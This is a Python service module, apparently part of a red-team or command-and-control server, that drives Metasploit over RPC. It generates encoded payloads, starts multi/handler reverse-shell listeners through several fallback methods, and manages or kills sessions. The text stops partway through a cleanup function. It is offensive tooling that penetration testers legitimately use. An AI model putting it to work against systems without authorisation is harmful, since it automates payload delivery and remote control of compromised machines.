"""
Metasploit Integration Service

Provides programmatic access to Metasploit Framework via RPC for:
- Dynamic payload generation
- Listener/handler management  
- Session monitoring and interaction
- Error handling and reconnection logic
"""

import socket
import time
import threading
from typing import Dict, Any, List, Optional, Tuple
from dataclasses import dataclass
from threading import Lock
from config import ServerConfig
from .custom_msf_rpc import (
    MetasploitRpcClient, MetasploitApiHandlers, PayloadGenerator,
    MetasploitRpcError, AuthenticationError, ConnectionError, RpcMethodError
)
import utils


@dataclass
class PayloadConfig:
    """Configuration for payload generation"""
    payload_type: str
    lhost: str
    lport: int
    format: str = 'exe'
    encoder: Optional[str] = None
    iterations: int = 1
    template: Optional[str] = None
    badchars: Optional[str] = None
    platform: Optional[str] = None
    arch: Optional[str] = None


@dataclass 
class ListenerConfig:
    """Configuration for Metasploit listeners"""
    payload_type: str
    lhost: str
    lport: int
    exit_on_session: bool = False
    persistent: bool = True


@dataclass
class MetasploitSession:
    """Represents an active Metasploit session"""
    session_id: str
    session_type: str
    info: str
    tunnel_local: str
    tunnel_peer: str
    via_exploit: str
    via_payload: str
    platform: str
    arch: str
    username: str
    computer: str
    uuid: str


class MetasploitService:
    """Service for interacting with Metasploit Framework via RPC"""
    
    def __init__(self, config: ServerConfig = None):
        self.config = config or ServerConfig()
        self._client = None
        self._handlers = None
        self._payload_generator = None
        self._connected = False
        self._connection_lock = Lock()
        self._last_connection_attempt = 0
        self._connection_retry_delay = 5  # seconds
        
        # Keep-alive mechanism
        self._keep_alive_timer = None
        self._last_activity = time.time()
        
    @property
    def is_enabled(self) -> bool:
        """Check if Metasploit integration is enabled"""
        return self.config.MSF_ENABLED
    
    @property
    def is_connected(self) -> bool:
        """Check if connected to Metasploit RPC"""
        return self._connected and self._client is not None
    
    def connect(self) -> bool:
        """Establish connection to Metasploit RPC server"""
        if not self.is_enabled:
            if utils.logger:
                utils.logger.log_message("Metasploit integration is disabled")
            return False
            
        with self._connection_lock:
            # Rate limit connection attempts
            current_time = time.time()
            if current_time - self._last_connection_attempt < self._connection_retry_delay:
                return False
                
            self._last_connection_attempt = current_time
            
            try:
                if utils.logger:
                    utils.logger.log_message(f"Connecting to Metasploit RPC at {self.config.MSF_RPC_HOST}:{self.config.MSF_RPC_PORT}")
                
                # Create custom RPC client
                self._client = MetasploitRpcClient(
                    host=self.config.MSF_RPC_HOST,
                    port=self.config.MSF_RPC_PORT,
                    username=self.config.MSF_RPC_USER,
                    password=self.config.MSF_RPC_PASS,
                    ssl=self.config.MSF_RPC_SSL,
                    uri=self.config.MSF_RPC_URI,
                    timeout=30
                )
                
                # Establish connection and authenticate
                if self._client.connect():
                    self._connected = True
                    
                    # Initialize handlers and payload generator
                    self._handlers = MetasploitApiHandlers(self._client)
                    self._payload_generator = PayloadGenerator(self._client)
                    
                    # Test connection with version info
                    version_info = self._handlers.core.version()
                    if utils.logger:
                        framework_version = version_info.get('version', 'Unknown')
                        utils.logger.log_message(f"Connected to Metasploit Framework {framework_version}")
                    
                    # Start keep-alive timer if enabled
                    self._start_keep_alive()
                    
                    return True
                else:
                    self._connected = False
                    self._client = None
                    return False
                
            except AuthenticationError as e:
                if utils.logger:
                    utils.logger.log_message(f"Metasploit authentication failed: {str(e)}")
                self._connected = False
                self._client = None
                return False
                
            except ConnectionError as e:
                if utils.logger:
                    utils.logger.log_message(f"Failed to connect to Metasploit RPC: {str(e)}")
                self._connected = False
                self._client = None
                return False
                
            except Exception as e:
                if utils.logger:
                    utils.logger.log_message(f"Unexpected error connecting to Metasploit RPC: {str(e)}")
                self._connected = False
                self._client = None
                return False
    
    def disconnect(self):
        """Disconnect from Metasploit RPC"""
        with self._connection_lock:
            # Stop keep-alive timer
            self._stop_keep_alive()
            
            if self._client:
                try:
                    self._client.disconnect()
                except:
                    pass
                    
            self._client = None
            self._handlers = None
            self._payload_generator = None
            self._connected = False
            if utils.logger:
                utils.logger.log_message("Disconnected from Metasploit RPC")
    
    def _ensure_connected(self) -> bool:
        """Ensure we have a valid connection, attempt reconnect if needed"""
        if self.is_connected:
            return True
            
        return self.connect()
    
    def _handle_rpc_error_with_retry(self, func, *args, **kwargs):
        """
        Execute an RPC function with automatic retry on session timeout
        
        Args:
            func: Function to execute
            *args: Function arguments
            **kwargs: Function keyword arguments
            
        Returns:
            Function result
            
        Raises:
            Exception: If retry fails or non-recoverable error
        """
        try:
            return func(*args, **kwargs)
        except RpcMethodError as e:
            error_msg = str(e).lower()
            
            # Check if this looks like a session timeout error
            if any(keyword in error_msg for keyword in ['session timeout', 'session may have expired', 'try reconnecting']):
                if utils.logger:
                    utils.logger.log_message(f"Detected possible session timeout: {str(e)}")
                    utils.logger.log_message("Attempting to reconnect to Metasploit RPC...")
                
                # Force disconnect and reconnect
                self.disconnect()
                
                if self.connect():
                    if utils.logger:
                        utils.logger.log_message("Reconnection successful, retrying operation...")
                    
                    # Retry the operation once
                    try:
                        return func(*args, **kwargs)
                    except Exception as retry_error:
                        if utils.logger:
                            utils.logger.log_message(f"Retry failed: {str(retry_error)}")
                        raise retry_error
                else:
                    if utils.logger:
                        utils.logger.log_message("Reconnection failed")
                    raise ConnectionError("Failed to reconnect to Metasploit RPC after session timeout")
            else:
                # Not a session timeout error, re-raise original exception
                raise
    
    def _start_keep_alive(self):
        """Start keep-alive timer to prevent session timeout"""
        if not self.config.MSF_SESSION_KEEP_ALIVE:
            return
            
        self._stop_keep_alive()  # Stop any existing timer
        
        self._keep_alive_timer = threading.Timer(
            self.config.MSF_KEEP_ALIVE_INTERVAL,
            self._keep_alive_tick
        )
        self._keep_alive_timer.daemon = True
        self._keep_alive_timer.start()
        
        if utils.logger:
            utils.logger.log_message(f"Started Metasploit keep-alive timer ({self.config.MSF_KEEP_ALIVE_INTERVAL}s interval)")
    
    def _stop_keep_alive(self):
        """Stop keep-alive timer"""
        if self._keep_alive_timer:
            self._keep_alive_timer.cancel()
            self._keep_alive_timer = None
    
    def _keep_alive_tick(self):
        """Perform keep-alive check"""
        try:
            # Check if we've had recent activity
            time_since_activity = time.time() - self._last_activity
            
            # Only send keep-alive if we haven't had activity recently
            if time_since_activity >= (self.config.MSF_KEEP_ALIVE_INTERVAL * 0.8):
                if self.is_connected and self._handlers:
                    # Simple keep-alive: get version info
                    version_info = self._handlers.core.version()
                    if utils.logger:
                        utils.logger.log_message("Metasploit keep-alive check successful")
                    self._last_activity = time.time()
            
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"Keep-alive check failed: {str(e)}")
        finally:
            # Restart timer if still connected
            if self.is_connected:
                self._start_keep_alive()
    
    def _update_activity(self):
        """Update last activity timestamp"""
        self._last_activity = time.time()
    
    def generate_payload(self, config: PayloadConfig) -> Tuple[bool, bytes, str]:
        """
        Generate a payload using Metasploit with automatic retry on session timeout
        
        Returns:
            Tuple of (success, payload_bytes, error_message)
        """
        if not self._ensure_connected():
            return False, b'', "Not connected to Metasploit RPC"
            
        def _generate_payload_internal():
            if utils.logger:
                utils.logger.log_message(f"Generating payload: {config.payload_type} ({config.format})")
            
            # Prepare payload options
            options = {
                'LHOST': config.lhost,
                'LPORT': config.lport
            }
            
            # Add optional parameters
            if config.encoder and config.encoder != 'none':
                options['Encoder'] = config.encoder
                options['Iterations'] = config.iterations
                
            if config.template:
                options['Template'] = config.template
                
            if config.badchars:
                options['BadChars'] = config.badchars
                
            if config.platform:
                options['Platform'] = config.platform
                
            if config.arch:
                options['Arch'] = config.arch
            
            # Use payload generator if available
            if self._payload_generator:
                success, payload_data, error = self._payload_generator.generate_payload(
                    config.payload_type, options, config.format
                )
                
                if success and utils.logger:
                    utils.logger.log_message(f"Generated payload: {len(payload_data)} bytes")
                
                return success, payload_data, error
            else:
                # Fallback to direct module execution
                result = self._handlers.module.execute('payload', config.payload_type, options)
                
                if result and 'payload' in result:
                    payload_data = result['payload']
                    if isinstance(payload_data, bytes):
                        if utils.logger:
                            utils.logger.log_message(f"Generated payload: {len(payload_data)} bytes")
                        return True, payload_data, ""
                    else:
                        return False, b'', f"Unexpected payload data type: {type(payload_data)}"
                else:
                    error = result.get('error', 'Unknown error during payload generation')
                    return False, b'', error
        
        try:
            # Use retry logic for payload generation
            result = self._handle_rpc_error_with_retry(_generate_payload_internal)
            self._update_activity()  # Update activity timestamp on success
            return result
        except (AuthenticationError, ConnectionError) as e:
            error_msg = f"Connection error generating payload: {str(e)}"
            if utils.logger:
                utils.logger.log_message(error_msg)
            return False, b'', error_msg
        except RpcMethodError as e:
            # RPC method errors now contain meaningful messages
            error_msg = f"Payload generation failed: {str(e)}"
            if utils.logger:
                utils.logger.log_message(error_msg)
            return False, b'', error_msg
        except Exception as e:
            error_msg = f"Unexpected error generating payload: {str(e)}"
            if utils.logger:
                utils.logger.log_message(error_msg)
            return False, b'', error_msg
    
    def start_listener(self, config: ListenerConfig) -> Tuple[bool, str, str]:
        """
        Start a Metasploit listener/handler using multiple methods for reliability
        
        Args:
            config: ListenerConfig object with payload details
        
        Returns:
            Tuple of (success, job_id, error_message)
        """
        if utils.logger:
            utils.logger.log_message(f"MetasploitService: start_listener called with payload: {config.payload_type}, lhost: {config.lhost}, lport: {config.lport}")
        
        if not self._ensure_connected():
            if utils.logger:
                utils.logger.log_message("MetasploitService: Not connected to Metasploit RPC")
            return False, "", "Not connected to Metasploit RPC"
        
        # Try multiple methods in order of reliability
        methods = [
            ("Enhanced Console Method", self._start_handler_via_enhanced_console),
            ("Module Execute Method", self._start_handler_via_module),
            ("Direct Job Method", self._start_handler_via_direct_job)
        ]
        
        for method_name, method_func in methods:
            if utils.logger:
                utils.logger.log_message(f"MetasploitService: Attempting {method_name}")
            
            try:
                success, job_id, error = method_func(config)
                if success and job_id:
                    if utils.logger:
                        utils.logger.log_message(f"MetasploitService: {method_name} succeeded - Job ID: {job_id}")
                    return True, job_id, ""
                else:
                    if utils.logger:
                        utils.logger.log_message(f"MetasploitService: {method_name} failed: {error}")
                        
            except Exception as e:
                if utils.logger:
                    utils.logger.log_message(f"MetasploitService: {method_name} exception: {str(e)}")
                continue
        
        return False, "", "All handler creation methods failed"
    
    def _start_handler_via_module(self, config: ListenerConfig) -> Tuple[bool, str, str]:
        """
        Start handler using the original module.execute method with enhanced options
        
        Args:
            config: ListenerConfig object with payload details
        
        Returns:
            Tuple of (success, job_id, error_message)
        """
        try:
            if utils.logger:
                utils.logger.log_message(f"MetasploitService: Starting handler via module.execute")
                
            # Enhanced handler options for better reliability
            options = {
                'PAYLOAD': config.payload_type,
                'LHOST': config.lhost,
                'LPORT': config.lport,
                'ExitOnSession': config.exit_on_session,
                'VERBOSE': True
            }
            
            # Add specific options for reverse payloads to improve binding
            if 'reverse' in config.payload_type.lower():
                options.update({
                    'ReverseAllowProxy': False,
                    'ReverseListenerComm': 'tcp',
                    'ReverseListenerBindAddress': '0.0.0.0',
                    'ReverseListenerBindPort': config.lport,
                    'PrependMigrate': False,
                    'PrependMigrateProc': ''
                })
            
            if utils.logger:
                utils.logger.log_message(f"MetasploitService: Enhanced options: {options}")
            
            result = self._handlers.module.execute('exploit', 'multi/handler', options)
            
            if utils.logger:
                utils.logger.log_message(f"MetasploitService: Module execute returned: {result}")
            
            if isinstance(result, dict):
                job_id = result.get('job_id')
                error_string = result.get('error_string', '')
                
                if job_id:
                    # Verify the job is active and handler is working
                    import time
                    time.sleep(3)  # Longer initialization time
                    
                    if self._verify_job_health(str(job_id)):
                        return True, str(job_id), ""
                    else:
                        # Clean up failed job
                        try:
                            self._handlers.job.stop(str(job_id))
                        except:
                            pass
                        return False, "", "Handler job unhealthy after creation"
                else:
                    error = error_string or result.get('error', 'No job ID returned')
                    return False, "", f"Module execute failed: {error}"
            else:
                return False, "", f"Unexpected result type: {type(result)}"
                
        except Exception as e:
            return False, "", f"Module execute error: {str(e)}"
    
    def _start_handler_via_enhanced_console(self, config: ListenerConfig) -> Tuple[bool, str, str]:
        """
        Enhanced console-based handler creation with better error handling
        
        Args:
            config: ListenerConfig object with payload details
        
        Returns:
            Tuple of (success, job_id, error_message)
        """
        console_id = None
        try:
            if utils.logger:
                utils.logger.log_message("MetasploitService: Starting enhanced console method")
            
            # Create console instance
            console_result = self._handlers.console.create()
            if not console_result or 'id' not in console_result:
                return False, "", "Failed to create console instance"
            
            console_id = console_result['id']
            if utils.logger:
                utils.logger.log_message(f"MetasploitService: Created console {console_id}")
            
            # Wait for console initialization
            import time
            time.sleep(1)
            
            # Clear any initial output
            self._handlers.console.read(console_id)
            
            # Build enhanced command sequence
            commands = [
                "use exploit/multi/handler",
                f"set PAYLOAD {config.payload_type}",
                f"set LHOST {config.lhost}",
                f"set LPORT {config.lport}",
                f"set ExitOnSession {str(config.exit_on_session).lower()}",
                "set VERBOSE true"
            ]
            
            # Add advanced options for better reliability
            if 'reverse' in config.payload_type.lower():
                commands.extend([
                    "set ReverseListenerBindAddress 0.0.0.0",
                    f"set ReverseListenerBindPort {config.lport}",
                    "set ReverseAllowProxy false",
                    "set PrependMigrate false"
                ])
            
            # Execute configuration commands
            for cmd in commands:
                if utils.logger:
                    utils.logger.log_message(f"MetasploitService: Console command: {cmd}")
                
                self._handlers.console.write(console_id, cmd)
                time.sleep(0.3)  # Allow command processing
            
            # Start the handler with enhanced options
            exploit_cmd = "exploit -j -z"  # Background job mode
            if utils.logger:
                utils.logger.log_message(f"MetasploitService: Starting handler: {exploit_cmd}")
            
            self._handlers.console.write(console_id, exploit_cmd)
            time.sleep(3)  # Allow handler startup
            
            # Read output to capture job ID
            output_result = self._handlers.console.read(console_id)
            if output_result and 'data' in output_result:
                output = output_result['data']
                if utils.logger:
                    utils.logger.log_message(f"MetasploitService: Console output: {output}")
                
                # Parse for job ID using multiple patterns
                import re
                patterns = [
                    r'\[.*\]\s+Started.*job\s+(\d+)',
                    r'Job\s+(\d+)\s+started',
                    r'handler\s+\(Job\s+(\d+)\)',
                    r'Job\s+ID:\s+(\d+)'
                ]
                
                job_id = None
                for pattern in patterns:
                    match = re.search(pattern, output, re.IGNORECASE)
                    if match:
                        job_id = match.group(1)
                        break
                
                if job_id:
                    if utils.logger:
                        utils.logger.log_message(f"MetasploitService: Found job ID {job_id} via console")
                    
                    # Verify job health
                    if self._verify_job_health(job_id):
                        return True, job_id, ""
                    else:
                        return False, "", f"Job {job_id} created but unhealthy"
                else:
                    # Check for error messages in output
                    if "error" in output.lower() or "failed" in output.lower():
                        return False, "", f"Console error: {output}"
                    else:
                        return False, "", "No job ID found in console output"
            else:
                return False, "", "No console output received"
                
        except Exception as e:
            return False, "", f"Enhanced console error: {str(e)}"
        finally:
            # Clean up console
            if console_id:
                try:
                    self._handlers.console.destroy(console_id)
                except:
                    pass
    
    def _start_handler_via_direct_job(self, config: ListenerConfig) -> Tuple[bool, str, str]:
        """
        Direct job creation method bypassing module.execute
        
        Args:
            config: ListenerConfig object with payload details
        
        Returns:
            Tuple of (success, job_id, error_message)
        """
        try:
            if utils.logger:
                utils.logger.log_message("MetasploitService: Attempting direct job method")
            
            # This method uses the job interface directly
            # which can sometimes work when module.execute fails
            payload_options = {
                'LHOST': config.lhost,
                'LPORT': config.lport,
                'ExitOnSession': config.exit_on_session
            }
            
            # Create job directly
            job_data = {
                'module_type': 'exploit',
                'module_name': 'multi/handler',
                'payload': config.payload_type,
                'options': payload_options
            }
            
            # This is a more experimental approach
            # Create console to execute job commands
            console_result = self._handlers.console.create()
            if not console_result or 'id' not in console_result:
                return False, "", "Cannot create console for direct job method"
            
            console_id = console_result['id']
            
            try:
                import time
                time.sleep(0.5)
                
                # Use jobs command to create handler directly
                job_cmd = f"jobs -i 'exploit/multi/handler PAYLOAD={config.payload_type} LHOST={config.lhost} LPORT={config.lport} ExitOnSession={str(config.exit_on_session).lower()}'"
                
                if utils.logger:
                    utils.logger.log_message(f"MetasploitService: Direct job command: {job_cmd}")
                
                self._handlers.console.write(console_id, job_cmd)
                time.sleep(2)
                
                # Read result
                output_result = self._handlers.console.read(console_id)
                if output_result and 'data' in output_result:
                    output = output_result['data']
                    
                    # Parse for job ID
                    import re
                    match = re.search(r'Job\s+(\d+)', output)
                    if match:
                        job_id = match.group(1)
                        if utils.logger:
                            utils.logger.log_message(f"MetasploitService: Direct job created: {job_id}")
                        return True, job_id, ""
                
                return False, "", "Direct job method failed to create handler"
                
            finally:
                self._handlers.console.destroy(console_id)
                
        except Exception as e:
            return False, "", f"Direct job error: {str(e)}"
    
    def _verify_job_health(self, job_id: str) -> bool:
        """
        Verify that a job is healthy and active
        
        Args:
            job_id: Job ID to check
        
        Returns:
            True if job is healthy, False otherwise
        """
        try:
            # Check if job exists in job list
            jobs = self._handlers.job.list()
            if str(job_id) not in jobs:
                if utils.logger:
                    utils.logger.log_message(f"MetasploitService: Job {job_id} not found in job list")
                return False
            
            # Get detailed job information
            job_info = self._handlers.job.info(str(job_id))
            if not job_info:
                if utils.logger:
                    utils.logger.log_message(f"MetasploitService: No info available for job {job_id}")
                return False
            
            # Check job status indicators
            job_name = jobs.get(str(job_id), '')
            if 'handler' not in job_name.lower():
                if utils.logger:
                    utils.logger.log_message(f"MetasploitService: Job {job_id} is not a handler job: {job_name}")
                return False
            
            if utils.logger:
                utils.logger.log_message(f"MetasploitService: Job {job_id} appears healthy: {job_name}")
            
            return True
            
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"MetasploitService: Error verifying job {job_id}: {str(e)}")
            return False
    
    def _verify_handler_binding(self, job_id: str, host: str, port: int, max_attempts: int = 5) -> bool:
        """
        Verify that a handler job is actually bound to the specified port
        
        Args:
            job_id: Job ID of the handler
            host: Host/IP the handler should be bound to
            port: Port the handler should be bound to
            max_attempts: Maximum number of verification attempts
            
        Returns:
            True if handler is bound and listening, False otherwise
        """
        import socket
        import time
        
        if utils.logger:
            utils.logger.log_message(f"MetasploitService: Verifying handler binding for job {job_id} on {host}:{port}")
        
        for attempt in range(max_attempts):
            # First check if job is still running
            try:
                jobs = self._handlers.job.list()
                if str(job_id) not in jobs:
                    if utils.logger:
                        utils.logger.log_message(f"MetasploitService: Job {job_id} no longer exists")
                    return False
                
                # Get job info to check status
                job_info = self._handlers.job.info(str(job_id))
                if job_info and job_info.get('jid') == int(job_id):
                    # Job exists, now check if port is bound
                    if utils.logger:
                        utils.logger.log_message(f"MetasploitService: Job {job_id} is running, checking port binding (attempt {attempt + 1}/{max_attempts})")
                    
                    # Check if port is bound by trying to bind to it ourselves
                    # If we can bind, the handler is not listening; if we can't, it probably is
                    test_host = '127.0.0.1' if host == '0.0.0.0' else host
                    port_is_bound = False
                    
                    try:
                        # Try to bind to the port - if this succeeds, nothing else is using it
                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as test_sock:
                            test_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                            test_sock.bind((test_host, port))
                            # If we get here, port is not in use
                            if utils.logger:
                                utils.logger.log_message(f"MetasploitService: Port {port} is available - handler not yet bound")
                            port_is_bound = False
                    except OSError as e:
                        if e.errno == 98:  # Address already in use
                            # Something is bound to the port - this is what we want for a handler
                            if utils.logger:
                                utils.logger.log_message(f"MetasploitService: Port {port} is in use - handler likely bound")
                            port_is_bound = True
                        else:
                            if utils.logger:
                                utils.logger.log_message(f"MetasploitService: Port binding test error: {str(e)}")
                            port_is_bound = False
                    except Exception as e:
                        if utils.logger:
                            utils.logger.log_message(f"MetasploitService: Error testing port binding: {str(e)}")
                        port_is_bound = False
                    
                    if port_is_bound:
                        # Port is in use, now verify it's actually our handler by checking job details
                        job_details = job_info.get('datastore', {})
                        if str(job_details.get('LPORT')) == str(port):
                            if utils.logger:
                                utils.logger.log_message(f"MetasploitService: Handler verified - job {job_id} bound to port {port}")
                            return True
                        else:
                            if utils.logger:
                                utils.logger.log_message(f"MetasploitService: Port in use but job details don't match expected handler")
                    else:
                        if utils.logger:
                            utils.logger.log_message(f"MetasploitService: Port {port} still available - handler not bound yet")
                
            except Exception as e:
                if utils.logger:
                    utils.logger.log_message(f"MetasploitService: Error checking job status: {str(e)}")
            
            # Wait before next attempt (exponential backoff)
            if attempt < max_attempts - 1:
                wait_time = 2 ** attempt  # 1, 2, 4, 8 seconds
                if utils.logger:
                    utils.logger.log_message(f"MetasploitService: Waiting {wait_time} seconds before next attempt...")
                time.sleep(wait_time)
        
        if utils.logger:
            utils.logger.log_message(f"MetasploitService: Handler verification failed after {max_attempts} attempts")
        return False
    
    def _start_handler_via_console(self, config: ListenerConfig) -> Tuple[bool, str, str]:
        """
        Start a handler using console commands as a fallback method
        
        This mimics how handlers are started in msfconsole and can be more reliable
        
        Args:
            config: Listener configuration
            
        Returns:
            Tuple of (success, job_id, error_message)
        """
        try:
            if utils.logger:
                utils.logger.log_message("MetasploitService: Starting handler via console commands")
            
            # Create a console instance
            console_result = self._handlers.console.create()
            if not console_result or 'id' not in console_result:
                # Check if this is a database error - these can often be worked around
                if isinstance(console_result, dict) and console_result.get('error') == 'database_module_error':
                    if utils.logger:
                        utils.logger.log_message("MetasploitService: Database error detected but handlers should still work via module.execute")
                    # Fall back to regular module.execute method instead of console
                    return False, "", "Console method has database issues, using module.execute instead"
                else:
                    return False, "", "Failed to create console instance"
            
            console_id = console_result['id']
            if utils.logger:
                utils.logger.log_message(f"MetasploitService: Created console {console_id}")
            
            try:
                # Wait for console to be ready
                time.sleep(0.5)
                
                # Clear any initial output
                self._handlers.console.read(console_id)
                
                # Send handler commands - use minimal reliable set
                commands = [
                    "use exploit/multi/handler",
                    f"set PAYLOAD {config.payload_type}",
                    f"set LHOST {config.lhost}",
                    f"set LPORT {config.lport}",
                    f"set ExitOnSession {str(config.exit_on_session).lower()}",
                    "exploit -j -z"  # Run as job in background
                ]
                
                # Execute each command
                for cmd in commands:
                    if utils.logger:
                        utils.logger.log_message(f"MetasploitService: Console command: {cmd}")
                    
                    self._handlers.console.write(console_id, cmd + "\n")
                    time.sleep(0.2)  # Small delay between commands
                
                # Wait for handler to start
                time.sleep(2)
                
                # Read console output to get job ID
                output_result = self._handlers.console.read(console_id)
                if output_result and 'data' in output_result:
                    output = output_result['data']
                    
                    # Parse output for job ID
                    import re
                    job_match = re.search(r'\[.*\]\s+Started.*job\s+(\d+)', output)
                    if job_match:
                        job_id = job_match.group(1)
                        if utils.logger:
                            utils.logger.log_message(f"MetasploitService: Handler started via console with job ID: {job_id}")
                        
                        # Verify binding
                        if self._verify_handler_binding(job_id, config.lhost, config.lport):
                            return True, job_id, ""
                        else:
                            # Stop the job if it didn't bind
                            self._handlers.job.stop(job_id)
                            return False, "", "Handler started via console but failed to bind"
                    else:
                        if utils.logger:
                            utils.logger.log_message(f"MetasploitService: Could not parse job ID from console output: {output}")
                        return False, "", "Failed to parse job ID from console output"
                else:
                    return False, "", "No output from console"
                
            finally:
                # Clean up console
                try:
                    self._handlers.console.destroy(console_id)
                except:
                    pass
                    
        except Exception as e:
            error_msg = f"Error starting handler via console: {str(e)}"
            if utils.logger:
                utils.logger.log_message(error_msg)
            return False, "", error_msg
    
    def stop_listener(self, job_id: str) -> Tuple[bool, str]:
        """
        Stop a Metasploit listener by job ID with verification
        
        Returns:
            Tuple of (success, error_message)
        """
        if not self._ensure_connected():
            return False, "Not connected to Metasploit RPC"
            
        try:
            # First check if job exists
            jobs = self._handlers.job.list()
            if str(job_id) not in jobs:
                if utils.logger:
                    utils.logger.log_message(f"Job {job_id} does not exist - already stopped")
                return True, ""  # Consider this success since job is gone
            
            if utils.logger:
                utils.logger.log_message(f"Stopping listener job: {job_id} ({jobs.get(str(job_id), 'unknown')})")
            
            # Check for active sessions associated with this job
            success = self._cleanup_job_sessions(job_id)
            if not success:
                if utils.logger:
                    utils.logger.log_message(f"Warning: Some sessions may still be active for job {job_id}")
            
            # Stop the job via RPC
            result = self._handlers.job.stop(job_id)
            
            # Wait longer for job cleanup (handlers can be slow to stop)
            import time
            time.sleep(2.0)  # Increased from 0.5s to 2s
            
            # Verify job is gone
            jobs_after = self._handlers.job.list()
            if str(job_id) in jobs_after:
                if utils.logger:
                    utils.logger.log_message(f"Job {job_id} still exists - attempting forced cleanup")
                
                success = self._force_stop_job(job_id)
                if not success:
                    return False, f"Job {job_id} could not be completely stopped"
            
            if utils.logger:
                utils.logger.log_message(f"Successfully stopped listener job: {job_id}")
                
            return True, ""
            
        except Exception as e:
            error_msg = f"Error stopping listener {job_id}: {str(e)}"
            if utils.logger:
                utils.logger.log_message(error_msg)
            return False, error_msg
    
    def _cleanup_job_sessions(self, job_id: str) -> bool:
        """
        Clean up any active sessions associated with a job before stopping it
        
        Returns:
            True if successful or no sessions found, False if some sessions couldn't be cleaned
        """
        try:
            # Get all active sessions
            sessions = self._handlers.session.list()
            if not sessions:
                return True
            
            sessions_cleaned = 0
            
            for session_id, session_info in sessions.items():
                try:
                    # Check if this session is associated with our job
                    # Sessions don't directly reference job IDs, but we can check via type
                    session_type = session_info.get('type', '').lower()
                    
                    # For handler jobs, look for reverse connections
                    if 'meterpreter' in session_type or 'shell' in session_type:
                        if utils.logger:
                            utils.logger.log_message(f"Found active session {session_id} ({session_type}) - stopping before job cleanup")
                        
                        self._handlers.session.stop(session_id)
                        sessions_cleaned += 1
                        
                except Exception as e:
                    if utils.logger:
                        utils.logger.log_message(f"Error stopping session {session_id}: {str(e)}")
            
            if sessions_cleaned > 0:
                import time
                time.sleep(1)  # Give sessions time to clean up
                
                if utils.logger:
                    utils.logger.log_message(f"Cleaned up {sessions_cleaned} sessions before stopping job {job_id}")
            
            return True
            
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"Error cleaning up sessions for job {job_id}: {str(e)}")
            return False
    
    def _force_stop_job(self, job_id: str) -> bool:
        """
        Force stop a job using multiple methods including console commands
        
        Returns:
            True if job was successfully stopped, False otherwise
        """
        try:
            if utils.logger:
                utils.logger.log_message(f"Force stopping job {job_id}")
            
            # Method 1: Try RPC stop again with longer wait
            try:
                self._handlers.job.stop(job_id)
                import time
                time.sleep(3)  # Even longer wait
                
                jobs = self._handlers.job.list()
                if str(job_id) not in jobs:
                    if utils.logger:
                        utils.logger.log_message(f"Job {job_id} stopped successfully with extended wait")
                    return True
            except:
                pass
            
            # Method 2: Use console command for forced cleanup
            try:
                # Create console for job termination
                console_id = self._handlers.console.create()
                if console_id:
                    # Kill job via console
                    self._handlers.console.write(console_id, f"jobs -k {job_id}")
                    import time
                    time.sleep(1)
                    
                    # Read console output
                    console_output = self._handlers.console.read(console_id)
                    if utils.logger:
                        utils.logger.log_message(f"Console kill output for job {job_id}: {console_output}")
                    
                    # Clean up console
                    self._handlers.console.destroy(console_id)
                    
                    # Check if job is gone
                    time.sleep(2)
                    jobs = self._handlers.job.list()
                    if str(job_id) not in jobs:
                        if utils.logger:
                            utils.logger.log_message(f"Job {job_id} force stopped via console")
                        return True
                        
            except Exception as e:
                if utils.logger:
                    utils.logger.log_message(f"Console force stop failed for job {job_id}: {str(e)}")
            
            # Final verification
            jobs = self._handlers.job.list()
            if str(job_id) not in jobs:
                return True
                
            if utils.logger:
                utils.logger.log_message(f"Job {job_id} could not be force stopped - may need manual intervention")
            return False
            
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"Error in force stop for job {job_id}: {str(e)}")
            return False
    
    def cleanup_failed_handlers(self) -> int:
        """
        Clean up failed or orphaned handler jobs
        
        Returns:
            Number of jobs cleaned up
        """
        if not self._ensure_connected():
            return 0
            
        try:
            jobs = self._handlers.job.list()
            cleaned_count = 0
            
            for job_id, job_name in jobs.items():
                try:
                    # Check if this is a multi/handler job
                    if "multi/handler" in job_name.lower():
                        # Get job details
                        job_info = self._handlers.job.info(str(job_id))
                        
                        if job_info:
                            # Check if handler is actually bound to its port
                            job_details = job_info.get('datastore', {})
                            lport = job_details.get('LPORT')
                            
                            if lport:
                                # Quick check if port is actually in use
                                import socket
                                port_in_use = False
                                try:
                                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as test_sock:
                                        test_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                                        test_sock.bind(('127.0.0.1', int(lport)))
                                        # If we can bind, nothing is using the port
                                        port_in_use = False
                                except OSError:
                                    # Can't bind - something is using it
                                    port_in_use = True
                                
                                # If job exists but port isn't bound, it's probably failed
                                if not port_in_use:
                                    if utils.logger:
                                        utils.logger.log_message(f"Cleaning up failed handler job {job_id} on unused port {lport}")
                                    
                                    # Use robust job stopping logic
                                    success, error = self.stop_listener(str(job_id))
                                    if success:
                                        cleaned_count += 1
                                    else:
                                        if utils.logger:
                                            utils.logger.log_message(f"Failed to clean up job {job_id}: {error}")
                            else:
                                # Handler job without port info - might be orphaned
                                if utils.logger:
                                    utils.logger.log_message(f"Found handler job {job_id} without port info - checking if orphaned")
                                
                                # Use robust cleanup for orphaned jobs too
                                success, error = self.stop_listener(str(job_id))
                                if success:
                                    cleaned_count += 1
                                    if utils.logger:
                                        utils.logger.log_message(f"Cleaned up orphaned handler job {job_id}")
                                else:
                                    if utils.logger:
                                        utils.logger.log_message(f"Failed to clean up orphaned job {job_id}: {error}")
                                    
                except Exception as e:
                    if utils.logger:
                        utils.logger.log_message(f"Error checking job {job_id}: {str(e)}")
                        
            if cleaned_count > 0 and utils.logger:
                utils.logger.log_message(f"Cleaned up {cleaned_count} failed handler jobs")
                
            return cleaned_count
            
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"Error during job cleanup: {str(e)}")
            return 0
    
    def cleanup_all_jobs(self, force: bool = False) -> int:
        """
        Clean up all jobs, optionally with force termination
        
        Args:
            force: If True, use force termination methods for all jobs
            
        Returns:
            Number of jobs cleaned up
        """
        if not self._ensure_connected():
            return 0
            
        try:
            jobs = self._handlers.job.list()
            if not jobs:
                return 0
                
            cleaned_count = 0
            
            if utils.logger:
